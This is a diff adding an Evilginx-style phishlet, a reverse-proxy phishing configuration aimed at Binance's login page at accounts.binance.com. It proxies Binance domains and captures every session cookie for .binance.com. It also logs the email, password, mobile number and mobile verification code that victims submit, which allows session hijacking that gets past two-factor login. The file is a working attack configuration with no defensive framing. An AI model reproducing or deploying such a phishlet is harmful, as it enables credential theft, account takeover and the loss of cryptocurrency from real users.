@@ -1,0 +1,40 @@
+author: '@test'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'binance.com', session: true, is_landing: true}
+  - {phish_sub: 'bin', orig_sub: 'bin', domain: 'bnbstatic.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.binance.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/my/dashboard'
+  - '/dashboard/.*'    
+credentials:
+  username:
+    key: 'leaked_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'leaked_password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mobile'
+      search: '(.*)'
+      type: 'post'
+    - key: 'mobileCode'
+      search: '(.*)'
+      type: 'post'
+    - key: 'email'
+      search: '(.*)'
+      type: 'post'      
+login:
+  domain: 'accounts.binance.com'
+  path: '/en/login'
